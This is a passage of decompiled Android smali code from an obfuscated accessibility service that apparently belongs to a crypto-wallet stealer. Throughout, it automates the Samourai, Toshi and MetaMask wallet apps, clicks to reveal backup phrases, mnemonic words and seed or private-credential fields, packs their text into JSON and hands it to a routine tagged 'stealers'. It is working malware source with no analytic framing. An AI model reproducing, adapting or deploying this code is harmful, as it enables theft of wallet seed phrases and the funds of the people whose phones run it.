    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_d9

    goto :goto_77

    :cond_d9
    const/4 v4, 0x2

    invoke-virtual {v2, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_da

    goto :goto_77

    :cond_da
    const/4 v5, 0x0

    invoke-static {v1, v2, v5, v4}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V
    :try_end_3f
    .catchall {:try_start_3f .. :try_end_3f} :catchall_22

    :goto_77
    :try_start_40
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_db

    goto :goto_78

    :cond_db
    invoke-virtual {v3}, Lb0/b;->i()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v6}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_dc

    goto :goto_78

    :cond_dc
    invoke-static {v2}, Lk0/f;->K(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_dd

    goto :goto_78

    :cond_dd
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    move-object/from16 v3, v23

    invoke-static {v2, v3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const/4 v3, 0x2

    const/4 v4, 0x0

    invoke-static {v1, v2, v4, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    sget-object v2, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v3, 0x96

    invoke-virtual {v2, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_de

    goto :goto_78

    :cond_de
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z
    :try_end_40
    .catchall {:try_start_40 .. :try_end_40} :catchall_1e

    goto :goto_78

    :catchall_1e
    move-exception v0

    move-object v2, v0

    :try_start_41
    invoke-static {v2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;
    :try_end_41
    .catchall {:try_start_41 .. :try_end_41} :catchall_22

    :goto_78
    :try_start_42
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_df

    goto :goto_79

    :cond_df
    const-string v3, "android:id/title"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_e0

    :goto_79
    const/4 v2, 0x0

    goto :goto_7a

    :cond_e0
    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v2

    :goto_7a
    const/4 v3, 0x4

    if-ne v2, v3, :cond_e5

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_e1

    goto :goto_7c

    :cond_e1
    const-string v3, "android:id/title"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_e2

    goto :goto_7c

    :cond_e2
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_e3

    goto :goto_7c

    :cond_e3
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2
    :try_end_42
    .catchall {:try_start_42 .. :try_end_42} :catchall_20

    move-object/from16 v3, v22

    :try_start_43
    invoke-static {v2, v3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const/4 v4, 0x2

    const/4 v5, 0x0

    invoke-static {v1, v2, v5, v4}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    sget-object v2, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v4, 0x32

    invoke-virtual {v2, v4, v5}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_e4

    goto :goto_7e

    :cond_e4
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z
    :try_end_43
    .catchall {:try_start_43 .. :try_end_43} :catchall_1f

    goto :goto_7e

    :catchall_1f
    move-exception v0

    :goto_7b
    move-object v2, v0

    goto :goto_7d

    :cond_e5
    :goto_7c
    move-object/from16 v3, v22

    goto :goto_7e

    :catchall_20
    move-exception v0

    move-object/from16 v3, v22

    goto :goto_7b

    :goto_7d
    :try_start_44
    invoke-static {v2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;
    :try_end_44
    .catchall {:try_start_44 .. :try_end_44} :catchall_22

    :goto_7e
    :try_start_45
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_e6

    goto :goto_7f

    :cond_e6
    const-string v4, "android:id/checkbox"

    invoke-virtual {v2, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_e7

    :goto_7f
    const/4 v2, 0x0

    goto :goto_80

    :cond_e7
    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v2

    :goto_80
    const/4 v4, 0x3

    if-ne v2, v4, :cond_eb

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_e8

    goto :goto_81

    :cond_e8
    const-string v4, "android:id/title"

    invoke-virtual {v2, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_e9

    goto :goto_81

    :cond_e9
    const/4 v4, 0x3

    invoke-interface {v2, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_ea

    goto :goto_81

    :cond_ea
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-static {v2, v3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const/4 v3, 0x2

    const/4 v4, 0x0

    invoke-static {v1, v2, v4, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V
    :try_end_45
    .catchall {:try_start_45 .. :try_end_45} :catchall_21

    goto :goto_81

    :catchall_21
    move-exception v0

    move-object v2, v0

    :try_start_46
    invoke-static {v2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_eb
    :goto_81
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_ec

    goto :goto_83

    :cond_ec
    sget-object v4, Lb0/b;->a:Lb0/b;

    invoke-virtual {v4}, Lb0/b;->i()Ljava/lang/String;

    move-result-object v5

    move-object/from16 v6, v16

    invoke-static {v5, v6}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-nez v3, :cond_ed

    goto :goto_83

    :cond_ed
    invoke-static {v3}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v3, :cond_ee

    goto :goto_83

    :cond_ee
    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v9, v5}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-nez v5, :cond_ef

    goto :goto_82

    :cond_ef
    invoke-virtual {v4}, Lb0/b;->i()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v6}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v5, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4

    if-nez v4, :cond_f0

    goto :goto_82

    :cond_f0
    invoke-static {v4}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v4, :cond_f1

    goto :goto_82

    :cond_f1
    const/4 v5, 0x0

    invoke-virtual {v4, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_f2

    goto :goto_82

    :cond_f2
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v4
    :try_end_46
    .catchall {:try_start_46 .. :try_end_46} :catchall_22

    if-nez v4, :cond_f3

    :goto_82
    const-string v4, ""

    :cond_f3
    :try_start_47
    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    :goto_83
    invoke-virtual {v2}, Lorg/json/JSONObject;->length()I

    move-result v3

    if-lez v3, :cond_f5

    sget-object v3, Lc0/b;->a:Lc0/b;

    const-string v4, "com.samourai.wallet"

    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v12}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v5, "stealers"

    invoke-virtual {v3, v1, v4, v2, v5}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "samourai"

    const-string v3, "1"

    .line 25
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v4, :cond_f4

    invoke-static {v11}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {v1, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    sput-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_f4
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v4}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    invoke-interface {v4, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 26
    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V
    :try_end_47
    .catchall {:try_start_47 .. :try_end_47} :catchall_22

    goto :goto_84

    :catchall_22
    move-exception v0

    move-object v2, v0

    invoke-static {v2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_f5
    :goto_84
    :try_start_48
    iget-object v2, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    sget-object v3, Lb0/b;->a:Lb0/b;

    invoke-virtual {v3}, Lb0/b;->j()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x2

    const/4 v6, 0x0

    invoke-static {v2, v4, v6, v5}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v2

    if-eqz v2, :cond_101

    const-string v2, "toshi"

    .line 27
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v4, :cond_f6

    invoke-static {v10}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {v1, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    sput-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_f6
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v4}, Ls0/c;->g(Ljava/lang/Object;)V

    const/4 v5, 0x0

    invoke-interface {v4, v2, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_101

    .line 28
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_f7

    goto :goto_85

    :cond_f7
    invoke-virtual {v3}, Lb0/b;->j()Ljava/lang/String;

    move-result-object v4

    const-string v5, ":id/action_settings"

    invoke-static {v4, v5}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_f8

    goto :goto_85

    :cond_f8
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_f9

    goto :goto_85

    :cond_f9
    const/4 v4, 0x2

    const/4 v5, 0x0

    invoke-static {v1, v2, v5, v4}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    :goto_85
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_fa

    goto :goto_86

    :cond_fa
    invoke-virtual {v3}, Lb0/b;->j()Ljava/lang/String;

    move-result-object v4

    const-string v5, ":id/backupPhrase"

    invoke-static {v4, v5}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_fb

    goto :goto_86

    :cond_fb
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_fc

    goto :goto_86

    :cond_fc
    const/4 v4, 0x2

    const/4 v5, 0x0

    invoke-static {v1, v2, v5, v4}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    :goto_86
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_fd

    goto :goto_88

    :cond_fd
    invoke-virtual {v3}, Lb0/b;->j()Ljava/lang/String;

    move-result-object v3

    const-string v5, ":id/mnemonicWord"

    invoke-static {v3, v5}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v4, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-nez v3, :cond_fe

    goto :goto_88

    :cond_fe
    invoke-interface {v3}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v3

    const/4 v4, 0x0

    :goto_87
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_ff

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v6

    invoke-static {v9, v6}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-virtual {v2, v6, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    add-int/lit8 v4, v4, 0x1

    goto :goto_87

    :cond_ff
    :goto_88
    invoke-virtual {v2}, Lorg/json/JSONObject;->length()I

    move-result v3

    if-lez v3, :cond_101

    sget-object v3, Lc0/b;->a:Lc0/b;

    const-string v4, "org.toshi"

    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v12}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v5, "stealers"

    invoke-virtual {v3, v1, v4, v2, v5}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "toshi"

    const-string v3, "1"

    .line 29
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v4, :cond_100

    invoke-static {v11}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {v1, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    sput-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_100
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v4}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    invoke-interface {v4, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 30
    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V
    :try_end_48
    .catchall {:try_start_48 .. :try_end_48} :catchall_23

    goto :goto_89

    :catchall_23
    move-exception v0

    move-object v2, v0

    invoke-static {v2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_101
    :goto_89
    :try_start_49
    iget-object v2, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    sget-object v3, Lb0/b;->a:Lb0/b;

    invoke-virtual {v3}, Lb0/b;->c()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x2

    const/4 v5, 0x0

    invoke-static {v2, v3, v5, v4}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v2

    if-eqz v2, :cond_114

    const-string v2, "metamask"

    .line 31
    sget-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v3, :cond_102

    invoke-static {v10}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v1, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    sput-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_102
    sget-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v3}, Ls0/c;->g(Ljava/lang/Object;)V

    const/4 v4, 0x0

    invoke-interface {v3, v2, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_114

    .line 32
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_103

    goto :goto_8b

    :cond_103
    const-string v3, "Hold to"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_104

    goto :goto_8b

    :cond_104
    invoke-interface {v2}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_105
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_106

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    move-object v5, v3

    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->isVisibleToUser()Z

    move-result v5

    if-eqz v5, :cond_105

    move-object v14, v3

    goto :goto_8a

    :cond_106
    move-object v14, v4

    :goto_8a
    check-cast v14, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v14, :cond_107

    goto :goto_8b

    :cond_107
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    new-instance v2, Landroid/graphics/Rect;

    invoke-direct {v2}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v14, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-static {}, Landroid/content/res/Resources;->getSystem()Landroid/content/res/Resources;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v3

    iget v3, v3, Landroid/util/DisplayMetrics;->widthPixels:I

    int-to-float v3, v3

    const/high16 v4, 0x40000000    # 2.0f

    div-float/2addr v3, v4

    invoke-virtual {v2}, Landroid/graphics/Rect;->centerY()I

    move-result v2

    int-to-float v2, v2

    const/4 v4, 0x1

    invoke-virtual {v1, v3, v2, v4}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->v(FFZ)Z

    :goto_8b
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_108

    goto :goto_8c

    :cond_108
    sget-object v3, Lb0/b;->a:Lb0/b;

    invoke-virtual {v3}, Lb0/b;->d()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_109

    goto :goto_8c

    :cond_109
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_10a

    goto :goto_8c

    :cond_10a
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_10b

    goto :goto_8c

    :cond_10b
    const/4 v3, 0x2

    const/4 v4, 0x0

    invoke-static {v1, v2, v4, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    :goto_8c
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_10c

    goto :goto_8d

    :cond_10c
    const-string v3, "MetaMetrics,"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_10d

    goto :goto_8d

    :cond_10d
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_10e

    goto :goto_8d

    :cond_10e
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_10f

    goto :goto_8d

    :cond_10f
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_110

    goto :goto_8d

    :cond_110
    const/4 v3, 0x2

    const/4 v4, 0x0

    invoke-static {v1, v2, v4, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    :goto_8d
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    const-string v3, "reveal-seed-button"

    invoke-virtual {v1, v2, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->B(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_111

    goto :goto_8e

    :cond_111
    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    :goto_8e
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    const-string v3, "private-credential-text"

    invoke-virtual {v1, v2, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->B(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_112

    goto :goto_8f

    :cond_112
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    const-string v4, "seed"

